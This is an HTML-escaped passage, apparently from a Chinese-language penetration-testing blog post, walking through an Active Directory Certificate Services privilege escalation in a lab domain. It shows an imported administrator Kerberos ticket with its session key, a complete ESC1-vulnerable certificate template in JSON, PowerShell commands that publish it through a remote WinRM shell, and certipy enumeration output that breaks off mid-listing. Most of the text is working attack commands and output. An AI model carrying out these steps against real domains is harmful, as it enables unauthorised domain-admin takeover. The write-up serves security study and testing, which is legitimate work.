+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      H4HrgKE1NUfduGzRmiS62PUJbPTRhy/aXL12XQvV6IiMgXPJ3KvIdkphxvlqS4oCKXmBiRuNvS9lMlCQ
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /yYqGfGco4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gGzAZoAMCARehEgQQVvE4TO9wnXeG
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      nNT3b7pdi6EOGwxXQUNLQURDUy5DT02iGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBA4QAA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      pREYDzIwMjUwODI5MTEwODA1WqYRGA8yMDI1MDgyOTIxMDgwNVqnERgPMjAyNTA5MDUxMTA4MDVaqA4b
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      DFdBQ0tBRENTLkNPTakhMB+gAwIBAqEYMBYbBmtyYnRndBsMd2Fja2FkY3MuY29t
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Ticket successfully imported!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ServiceName           :  krbtgt/wackadcs.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ServiceRealm          :  WACKADCS.COM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  UserName              :  administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  UserRealm             :  WACKADCS.COM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  StartTime             :  2025/8/29 19:08:05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  EndTime               :  2025/8/30 5:08:05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  RenewTill             :  2025/9/5 19:08:05
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  KeyType               :  rc4_hmac
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Base64&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;key&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;           :  VvE4TO9wnXeGnNT3b7pdiw&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到已经攻击成功了，我们通过pkiadmin在一个本没有可利用证书的环境中搞到了域管票据&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; klist
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;当前登录 ID 是 0:0xc60529
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;缓存的票证: &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#0&amp;gt;	客户端: administrator @ WACKADCS.COM&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	服务器: krbtgt/wackadcs.com @ WACKADCS.COM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	票证标志 0x40e10000 -&amp;gt; forwardable renewable initial pre_authent name_canonicalize 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	开始时间: 8/29/2025 19:08:05 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;本地&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	结束时间:   8/30/2025 5:08:05 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;本地&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	续订时间: 9/5/2025 19:08:05 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;本地&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	会话密钥类型: RSADSI RC4-HMAC&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;NT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	缓存标志: 0x1 -&amp;gt; PRIMARY 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	调用的 KDC: 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;快速攻击&#34;&gt;快速攻击
+&lt;/h2&gt;&lt;p&gt;在我完成以上的实操测试后我感觉实在是有些繁琐，我不相信实际域环境中不具备远程管理证书服务的工具&lt;/p&gt;
+&lt;p&gt;最终我找到了这个&lt;a class=&#34;link&#34; href=&#34;https://github.com/GoateePFE/ADCSTemplate/blob/master/ADCSTemplate.psm1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ADCSTemplate&lt;/a&gt;脚本，它不是为了注册恶意模板的，事实上它甚至不会被标记为恶意脚本，只是它恰好具备了我们需要的远程注册证书的功能&lt;/p&gt;
+&lt;p&gt;为了利用它，我们需要将之前的esc1模板写成一个完整的json格式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESC1&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;displayName&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ESC1&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;objectClass&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKICertificateTemplate&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flags&amp;#34;&lt;/span&gt;:  131616,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;revision&amp;#34;&lt;/span&gt;:  100,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Cert-Template-OID&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Certificate-Application-Policy&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.5.5.7.3.2&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                             &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Certificate-Name-Flag&amp;#34;&lt;/span&gt;:  1,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Enrollment-Flag&amp;#34;&lt;/span&gt;:  0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Minimal-Key-Size&amp;#34;&lt;/span&gt;:  2048,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Private-Key-Flag&amp;#34;&lt;/span&gt;:  16842752,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-RA-Signature&amp;#34;&lt;/span&gt;:  0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Template-Minor-Revision&amp;#34;&lt;/span&gt;:  4,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msPKI-Template-Schema-Version&amp;#34;&lt;/span&gt;:  2,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKICriticalExtensions&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.5.29.15&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.5.29.7&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                              &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIDefaultCSPs&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3,Microsoft Base DSS Cryptographic Provider&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2,Microsoft Base Cryptographic Provider v1.0&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                           &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1,Microsoft Enhanced Cryptographic Provider v1.0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                       &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIDefaultKeySpec&amp;#34;&lt;/span&gt;:  2,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIExpirationPeriod&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                64,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                57,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                135,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                46,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                225,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                254,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIExtendedKeyUsage&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.3.6.1.5.5.7.3.2&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIKeyUsage&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        128,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIMaxIssuingDepth&amp;#34;&lt;/span&gt;:  0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pKIOverlapPeriod&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             0,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             128,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             166,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             10,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             255,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             222,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             255,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                             &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                         &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后将这个json以及脚本传递到目标上去，运行如下命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; import-module .&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;DCSTemplate.psm1 &lt;span style=&#34;color:#75715e&#34;&gt;#导入模块&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; New-ADCSTemplate -DisplayName ESC -JSON &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Get-Content .&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;SC1.json -Raw&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; -Publish -Identity &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WACKADCS\PKI
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Admins&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#注册模板并且指定可请求组&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行完毕后可以看到也是成功注册&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/adcs-test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; certificate authority
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; enabled certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; OIDs linked to templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt; via RRP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Failed to connect to remote registry. Service should be starting now. Trying again...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully retrieved CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Checking web enrollment &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; CA &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackadcs-DC-CA&amp;#39;&lt;/span&gt; @ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc.wackadcs.com&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumeration output:
